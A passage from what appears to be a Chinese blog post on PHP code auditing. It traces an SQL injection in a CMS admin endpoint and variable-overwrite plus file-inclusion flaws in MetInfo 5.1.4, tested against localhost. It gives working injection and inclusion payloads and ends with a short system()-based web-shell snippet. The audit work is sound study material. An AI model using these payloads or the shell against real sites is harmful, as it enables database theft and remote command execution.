class="string">&#x27;R&#x27;</span>);</span><br><span class="line"><span class="variable">$archive</span> = <span class="keyword">empty</span>(<span class="variable">$archive</span>) ? <span class="string">&#x27;adminuser&#x27;</span> : <span class="variable">$archive</span>;</span><br><span class="line"><span class="variable">$action</span> = indexget(<span class="string">&#x27;action&#x27;</span>, <span class="string">&#x27;R&#x27;</span>);</span><br><span class="line"><span class="variable">$action</span> = <span class="keyword">empty</span>(<span class="variable">$action</span>) ? <span class="string">&#x27;login&#x27;</span> : <span class="variable">$action</span>;</span><br><span class="line"><span class="variable">$soft_MOD</span> = <span class="keyword">array</span>(<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;public&#x27;</span>, <span class="string">&#x27;product&#x27;</span>, <span class="string">&#x27;forum&#x27;</span>, <span class="string">&#x27;filemanage&#x27;</span>, <span class="string">&#x27;basebook&#x27;</span>, <span class="string">&#x27;member&#x27;</span>, <span class="string">&#x27;order&#x27;</span>, <span class="string">&#x27;other&#x27;</span>, <span class="string">&#x27;news&#x27;</span>, <span class="string">&#x27;inc&#x27;</span>, <span class="string">&#x27;cache&#x27;</span>, <span class="string">&#x27;bann&#x27;</span>, <span class="string">&#x27;logs&#x27;</span>, <span class="string">&#x27;template&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (in_array(<span class="variable">$point</span>, <span class="variable">$soft_MOD</span>)) &#123;</span><br><span class="line">	<span class="keyword">include</span> admin_ROOT . adminfile . <span class="string">&quot;/control/<span class="subst">$archive</span>.php&quot;</span>;</span><br><span class="line">	<span class="variable">$control</span> = <span class="keyword">new</span> important();</span><br><span class="line">	<span class="variable">$action</span> = <span class="string">&#x27;on&#x27;</span> . <span class="variable">$action</span>;</span><br><span class="line">	<span class="keyword">if</span> (method_exists(<span class="variable">$control</span>, <span class="variable">$action</span>)) &#123;</span><br><span class="line">		<span class="variable">$control</span>-&gt;<span class="variable">$action</span>();</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">&#x27;错误：系统方法错误！&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">exit</span>(<span class="string">&#x27;错误：系统对象错误&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">indexget</span>(<span class="params"><span class="variable">$k</span>, <span class="variable">$var</span>=<span class="string">&#x27;R&#x27;</span>, <span class="variable">$htmlcode</span>=<span class="literal">true</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">switch</span> (<span class="variable">$var</span>) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;G&#x27;</span>:</span><br><span class="line">			<span class="variable">$var</span> = &amp;<span class="variable">$_GET</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;P&#x27;</span>:</span><br><span class="line">			<span class="variable">$var</span> = &amp;<span class="variable">$_POST</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>:</span><br><span class="line">			<span class="variable">$var</span> = &amp;<span class="variable">$_COOKIE</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;R&#x27;</span>:</span><br><span class="line">			<span class="variable">$var</span> = &amp;<span class="variable">$_GET</span>;</span><br><span class="line">			<span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$var</span>[<span class="variable">$k</span>])) &#123;</span><br><span class="line">				<span class="variable">$var</span> = &amp;<span class="variable">$_POST</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$putvalue</span> = <span class="keyword">isset</span>(<span class="variable">$var</span>[<span class="variable">$k</span>]) ? indexdaddslashes(<span class="variable">$var</span>[<span class="variable">$k</span>], <span class="number">0</span>) : <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$htmlcode</span> ? indexhtmldecode(<span class="variable">$putvalue</span>) : <span class="variable">$putvalue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不难发现<code>point</code>、<code>archive</code>、<code>action</code> 都经过了indexget处理，专项indexget()方法可知，此方法就是在citylist中的accept，函数用法什么的都一个样，其中<code>$Point</code>的值需要在数组<code>soft_MOD</code>内，<code>$archive</code>需要为citylist，这样才能成功在下面的语句中将citylist.php页面包含 ,<code>$action</code> 值需要为<strong>citylist</strong>，这样才可被拼接，成功调用oncitylist方法，成功执行sql语句</p>
<p>由此构建payload：</p>
<p>此处point可不填，默认会被指为admin，也在soft_mod组内</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/cms/adminsoft/index.php?point=basebook&amp;archive=citylist&amp;action=citylist&amp;parentid=1</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-4.assets/image-20211026154542193.png" alt="image-20211026154542193"></p>
<p>进行sql注入测试:</p>
<p>爆表爆字段时，需要引号括起数据库、表名时可用16进制绕过<code>daddslashes</code>对特殊字符的转义处理。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/cms/adminsoft/index.php?point=basebook&amp;archive=citylist&amp;action=citylist&amp;parentid=-1 union select 1,2,group_concat(table_name),4,5 from information_schema.tables where table_schema=0x657370636D73</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-4.assets/image-20211026155204670.png" alt="image-20211026155204670"></p>
<h4 id="MeInfo-5-1-4漏洞审计"><a href="#MeInfo-5-1-4漏洞审计" class="headerlink" title="MeInfo 5.1.4漏洞审计"></a>MeInfo 5.1.4漏洞审计</h4><p>1.未授权访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/meInfo/admin/app/physical/standard.php</span><br></pre></td></tr></table></figure>

<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-4.assets/image-20211027102145398.png" alt="image-20211027102145398"></p>
<p>2.文件包含漏洞</p>
<p>安装MetInfo5.1.4版本</p>
<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-4.assets/image-20211027113702048.png" alt="image-20211027113702048"></p>
<p>利用esay检查可疑点，可以看到提示此处可能存在变量覆盖，双击进入php文件进行审计</p>
<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-4.assets/image-20211027114139562.png" alt="image-20211027114139562"></p>
<p>此处放出漏洞点</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">&#x27;_COOKIE&#x27;</span>, <span class="string">&#x27;_POST&#x27;</span>, <span class="string">&#x27;_GET&#x27;</span>) <span class="keyword">as</span> <span class="variable">$_request</span>) &#123;</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$$_request</span> <span class="keyword">as</span> <span class="variable">$_key</span> =&gt; <span class="variable">$_value</span>) &#123;</span><br><span class="line">		<span class="variable">$_key</span>&#123;<span class="number">0</span>&#125; != <span class="string">&#x27;_&#x27;</span> &amp;&amp; <span class="variable">$$_key</span> = daddslashes(<span class="variable">$_value</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>1.在common.inc.php中，利用第一层foreach循环，将<code>_COOKIE、_POST、_GET</code>的值传给$_reuqest变量；</p>
<p>2.第二层foreach循环，将$$_request也就是<code>$_GET、$_POST、$_COOKIE</code>超全局变量中的键与值拆分成<code>$_key 与 $_value</code>形式拿到相应类型请求的变量名与变量值；</p>
<p>3.利用<code>$_key&#123;0&#125; != &#39;_&#39; &amp;&amp; $$_key = daddslashes($_value);</code> 来判$<em>key有是否是超全局变量</em>(比如说_SERVER这种)，不是则对变量值进行递归的addslashes处理。</p>
<p>getshell<strong>思路</strong></p>
<p>此处我们可以利用这一流程，通过cookie、get、post的请求方式，进行变量覆盖操作，若想要getshell，我们首先需要先找到一个包含了<code>common.inc.php</code>的php文件，并且该文件的变量我们可以通过$$变量覆盖，从而操纵sql语句或配合文件上传或日志文件对文件包含进行操作从而getshell。</p>
<p>利用全局搜索功能，搜索包含了common.inc.php的文件,找到合适目标/include/module.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;common.inc.php&#x27;</span>;</span><br><span class="line"><span class="variable">$modulefname</span>[<span class="number">1</span>] = <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">&#x27;show.php&#x27;</span>,<span class="number">1</span>=&gt;<span class="string">&#x27;show.php&#x27;</span>,<span class="number">2</span>=&gt;<span class="variable">$met_column</span>);</span><br><span class="line"><span class="variable">$modulefname</span>[<span class="number">2</span>] = <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">&#x27;news.php&#x27;</span>,<span class="number">1</span>=&gt;<span class="string">&#x27;shownews.php&#x27;</span>,<span class="number">2</span>=&gt;<span class="variable">$met_news</span>);</span><br><span class="line"><span class="variable">$modulefname</span>[<span class="number">3</span>] = <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">&#x27;product.php&#x27;</span>,<span class="number">1</span>=&gt;<span class="string">&#x27;showproduct.php&#x27;</span>,<span class="number">2</span>=&gt;<span class="variable">$met_product</span>);</span><br><span class="line"><span class="variable">$modulefname</span>[<span class="number">4</span>] = <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">&#x27;download.php&#x27;</span>,<span class="number">1</span>=&gt;<span class="string">&#x27;showdownload.php&#x27;</span>,<span class="number">2</span>=&gt;<span class="variable">$met_download</span>);</span><br><span class="line"><span class="variable">$modulefname</span>[<span class="number">5</span>] = <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">&#x27;img.php&#x27;</span>,<span class="number">1</span>=&gt;<span class="string">&#x27;showimg.php&#x27;</span>,<span class="number">2</span>=&gt;<span class="variable">$met_img</span>);</span><br><span class="line"><span class="variable">$modulefname</span>[<span class="number">6</span>] = <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">&#x27;job.php&#x27;</span>,<span class="number">1</span>=&gt;<span class="string">&#x27;showjob.php&#x27;</span>,<span class="number">2</span>=&gt;<span class="variable">$met_job</span>);</span><br><span class="line"><span class="variable">$modulefname</span>[<span class="number">8</span>] = <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">&#x27;feedback.php&#x27;</span>,<span class="number">1</span>=&gt;<span class="string">&#x27;feedback.php&#x27;</span>,<span class="number">2</span>=&gt;<span class="variable">$met_column</span>);</span><br><span class="line"><span class="variable">$modulefname</span>[<span class="number">100</span>] = <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">&#x27;product.php&#x27;</span>,<span class="number">1</span>=&gt;<span class="string">&#x27;showproduct.php&#x27;</span>,<span class="number">2</span>=&gt;<span class="variable">$met_product</span>);</span><br><span class="line"><span class="variable">$modulefname</span>[<span class="number">101</span>] = <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">&#x27;product.php&#x27;</span>,<span class="number">1</span>=&gt;<span class="string">&#x27;showproduct.php&#x27;</span>,<span class="number">2</span>=&gt;<span class="variable">$met_product</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$metid</span>) &amp;&amp; <span class="variable">$met_pseudo</span>)&#123;</span><br><span class="line">	<span class="comment">/*if(is_numeric($metid))&#123;</span></span><br><span class="line"><span class="comment">		if($list)&#123;</span></span><br><span class="line"><span class="comment">		&#125;else&#123;</span></span><br><span class="line"><span class="comment">			$modulelang=$lang?$lang:$met_index_type;	</span></span><br><span class="line"><span class="comment">			$numerok = $db-&gt;get_one(&quot;SELECT * FROM $met_column WHERE foldername=&#x27;$filpy&#x27; and (bigclass=&#x27;0&#x27; or releclass!=&#x27;0&#x27;) and module&lt;100 and lang=&#x27;$modulelang&#x27;&quot;);</span></span><br><span class="line"><span class="comment">		&#125;</span></span><br><span class="line"><span class="comment">	&#125;else&#123;</span></span><br><span class="line"><span class="comment">		$dname = is_numeric($metid)?&quot;id=$metid&quot;:&quot;filename=&#x27;$metid&#x27;&quot;;</span></span><br><span class="line"><span class="comment">	&#125;*/</span></span><br><span class="line">	<span class="variable">$dname</span> = is_numeric(<span class="variable">$metid</span>)?<span class="string">&quot;id=<span class="subst">$metid</span>&quot;</span>:<span class="string">&quot;filename=&#x27;<span class="subst">$metid</span>&#x27;&quot;</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$list</span>)&#123;<span class="comment">/*��ֹ������*/</span></span><br><span class="line">		<span class="variable">$anyone</span> = <span class="variable">$db</span>-&gt;get_one(<span class="string">&quot;SELECT * FROM <span class="subst">$met_column</span> WHERE <span class="subst">$dname</span> and lang =&#x27;<span class="subst">$lang</span>&#x27;&quot;</span>);	</span><br><span class="line">		<span class="keyword">if</span>(!is_array(<span class="variable">$anyone</span>))&#123;</span><br><span class="line">			<span class="variable">$metids</span>=explode(<span class="string">&#x27;-&#x27;</span>,<span class="variable">$metid</span>);</span><br><span class="line">			<span class="variable">$metidcount</span>=count(<span class="variable">$metids</span>)-<span class="number">1</span>;</span><br><span class="line">			<span class="variable">$page</span>=<span class="variable">$metids</span>[<span class="variable">$metidcount</span>];</span><br><span class="line">			<span class="variable">$metid</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">			<span class="keyword">foreach</span>(<span class="variable">$metids</span> <span class="keyword">as</span> <span class="variable">$keymetid</span>=&gt;<span class="variable">$valmetid</span>)&#123;</span><br><span class="line">				<span class="keyword">if</span>(<span class="variable">$keymetid</span>!=<span class="variable">$metidcount</span>)&#123;</span><br><span class="line">					<span class="variable">$metid</span>.=<span class="variable">$valmetid</span>.<span class="string">&#x27;-&#x27;</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(!<span class="variable">$metid</span>||!<span class="variable">$page</span>)&#123;okinfo(<span class="string">&#x27;../404.html&#x27;</span>);<span class="keyword">exit</span>();&#125;</span><br><span class="line">			<span class="variable">$metid</span>=rtrim(<span class="variable">$metid</span>,<span class="string">&#x27;-&#x27;</span>);</span><br><span class="line">			<span class="variable">$dname</span> = is_numeric(<span class="variable">$metid</span>)?<span class="string">&quot;id=<span class="subst">$metid</span>&quot;</span>:<span class="string">&quot;filename=&#x27;<span class="subst">$metid</span>&#x27;&quot;</span>;</span><br><span class="line">			<span class="variable">$anyone</span> = <span class="variable">$db</span>-&gt;get_one(<span class="string">&quot;SELECT * FROM <span class="subst">$met_column</span> WHERE <span class="subst">$dname</span> and lang =&#x27;<span class="subst">$lang</span>&#x27;&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(!is_array(<span class="variable">$anyone</span>) &amp;&amp; is_numeric(<span class="variable">$metid</span>))&#123;</span><br><span class="line">			<span class="variable">$dname</span> = <span class="string">&quot;filename=&#x27;<span class="subst">$metid</span>&#x27;&quot;</span>;</span><br><span class="line">			<span class="variable">$anyone</span> = <span class="variable">$db</span>-&gt;get_one(<span class="string">&quot;SELECT * FROM <span class="subst">$met_column</span> WHERE <span class="subst">$dname</span> and lang =&#x27;<span class="subst">$lang</span>&#x27;&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(!is_array(<span class="variable">$anyone</span>))&#123;okinfo(<span class="string">&#x27;../404.html&#x27;</span>);<span class="keyword">exit</span>();&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$anyone</span>[<span class="string">&#x27;releclass&#x27;</span>])&#123;</span><br><span class="line">			<span class="variable">$class1</span>=<span class="variable">$metid</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$anyone</span>[<span class="string">&#x27;classtype&#x27;</span>]==<span class="number">1</span>)<span class="variable">$class1</span>= <span class="variable">$anyone</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$anyone</span>[<span class="string">&#x27;classtype&#x27;</span>]==<span class="number">2</span>)<span class="variable">$class2</span>= <span class="variable">$anyone</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$anyone</span>[<span class="string">&#x27;classtype&#x27;</span>]==<span class="number">3</span>)<span class="variable">$class3</span>= <span class="variable">$anyone</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$mdle</span> = <span class="variable">$anyone</span>[<span class="string">&#x27;module&#x27;</span>];</span><br><span class="line">		<span class="variable">$mdtp</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">		<span class="variable">$lang</span> = <span class="variable">$anyone</span>[<span class="string">&#x27;lang&#x27;</span>];</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$anybody</span> = <span class="variable">$db</span>-&gt;get_one(<span class="string">&quot;SELECT * FROM <span class="subst">$met_column</span> WHERE foldername=&#x27;<span class="subst">$filpy</span>&#x27; and lang=&#x27;<span class="subst">$lang</span>&#x27;&quot;</span>);</span><br><span class="line">		<span class="variable">$danmy</span> = <span class="variable">$modulefname</span>[<span class="variable">$anybody</span>[<span class="string">&#x27;module&#x27;</span>]][<span class="number">2</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$anybody</span>[<span class="string">&#x27;module&#x27;</span>]==<span class="number">8</span>)<span class="variable">$metid</span>=<span class="variable">$anybody</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">		<span class="variable">$anyone</span> = <span class="variable">$db</span>-&gt;get_one(<span class="string">&quot;SELECT * FROM <span class="subst">$danmy</span> WHERE <span class="subst">$dname</span> and lang =&#x27;<span class="subst">$lang</span>&#x27;&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span>(!<span class="variable">$anyone</span> &amp;&amp; is_numeric(<span class="variable">$metid</span>))&#123;</span><br><span class="line">			<span class="variable">$dname</span> = <span class="string">&quot;filename=&#x27;<span class="subst">$metid</span>&#x27;&quot;</span>;</span><br><span class="line">			<span class="variable">$anyone</span> = <span class="variable">$db</span>-&gt;get_one(<span class="string">&quot;SELECT * FROM <span class="subst">$danmy</span> WHERE <span class="subst">$dname</span> and lang =&#x27;<span class="subst">$lang</span>&#x27;&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$mdtp</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">		<span class="variable">$id</span> = <span class="variable">$anybody</span>[<span class="string">&#x27;module&#x27;</span>]==<span class="number">8</span>?<span class="variable">$anybody</span>[<span class="string">&#x27;id&#x27;</span>]:<span class="variable">$anyone</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">		<span class="variable">$mdle</span> = <span class="variable">$anybody</span>[<span class="string">&#x27;module&#x27;</span>];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$modulelang</span>=<span class="variable">$lang</span>?<span class="variable">$lang</span>:<span class="variable">$met_index_type</span>;</span><br><span class="line">	<span class="variable">$query</span>=<span class="string">&quot;SELECT * FROM <span class="subst">$met_column</span> WHERE foldername=&#x27;<span class="subst">$filpy</span>&#x27; and (bigclass=&#x27;0&#x27; or releclass!=&#x27;0&#x27;) and module&lt;100 and lang=&#x27;<span class="subst">$modulelang</span>&#x27;&quot;</span>;</span><br><span class="line">	<span class="variable">$anyone</span> = <span class="variable">$db</span>-&gt;get_one(<span class="variable">$query</span>);	</span><br><span class="line">	<span class="variable">$class1</span> = <span class="variable">$anyone</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">	<span class="variable">$mdle</span> = <span class="variable">$anyone</span>[<span class="string">&#x27;module&#x27;</span>];</span><br><span class="line">	<span class="variable">$mdtp</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$fmodule</span>!=<span class="number">7</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$mdle</span>==<span class="number">100</span>)<span class="variable">$mdle</span>=<span class="number">3</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$mdle</span>==<span class="number">101</span>)<span class="variable">$mdle</span>=<span class="number">5</span>;</span><br><span class="line">	<span class="variable">$module</span> = <span class="variable">$modulefname</span>[<span class="variable">$mdle</span>][<span class="variable">$mdtp</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$module</span>==<span class="literal">NULL</span>)&#123;okinfo(<span class="string">&#x27;../404.html&#x27;</span>);<span class="keyword">exit</span>();&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$mdle</span>==<span class="number">2</span>||<span class="variable">$mdle</span>==<span class="number">3</span>||<span class="variable">$mdle</span>==<span class="number">4</span>||<span class="variable">$mdle</span>==<span class="number">5</span>||<span class="variable">$mdle</span>==<span class="number">6</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$fmodule</span>==<span class="variable">$mdle</span>)&#123;</span><br><span class="line">			<span class="variable">$module</span> = <span class="variable">$modulefname</span>[<span class="variable">$mdle</span>][<span class="variable">$mdtp</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			okinfo(<span class="string">&#x27;../404.html&#x27;</span>);<span class="keyword">exit</span>();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$list</span>)&#123;</span><br><span class="line">			okinfo(<span class="string">&#x27;../404.html&#x27;</span>);<span class="keyword">exit</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$module</span> = <span class="variable">$modulefname</span>[<span class="variable">$mdle</span>][<span class="variable">$mdtp</span>];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$mdle</span>==<span class="number">8</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="variable">$id</span>)<span class="variable">$id</span>=<span class="variable">$class1</span>;</span><br><span class="line">	<span class="variable">$module</span> = <span class="string">&#x27;../feedback/index.php&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到在代码中，存在$module，对文件进行了包含，并且在整个php文件中存在多处if于exit()通过审计可知，绕过payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?fmodule=<span class="number">7</span>&amp;module=./<span class="number">123</span>.txt <span class="comment">#于include目录提前准备好了一个123.txt</span></span><br></pre></td></tr></table></figure>

<p>跟踪包含/include/module的文件，发现利用点文件:<code>/about/index.php</code></p>
<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-4.assets/image-20211027124207361.png" alt="image-20211027124207361"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># MetInfo Enterprise Content Management System </span></span><br><span class="line"><span class="comment"># Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. </span></span><br><span class="line"><span class="variable">$filpy</span> = basename(dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line"><span class="variable">$fmodule</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;../include/module.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="variable">$module</span>;</span><br><span class="line"><span class="comment"># This program is an open source system, commercial use, please consciously to purchase commercial license.</span></span><br><span class="line"><span class="comment"># Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>构造payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?fmodule=<span class="number">7</span>&amp;module=../<span class="keyword">include</span>/<span class="number">123</span>.txt</span><br></pre></td></tr></table></figure>



<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-4.assets/image-20211027124459419.png" alt="image-20211027124459419"></p>
<p>至此，成功包含文件执行，可配合日志文件写shell或文件上传图片马getshell.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$b = $_GET[&#x27;whoami&#x27;];</span><br><span class="line">$b = system($B);</span><br></pre></td></tr></table></figure>


      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-PHP代码审计学习-3" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
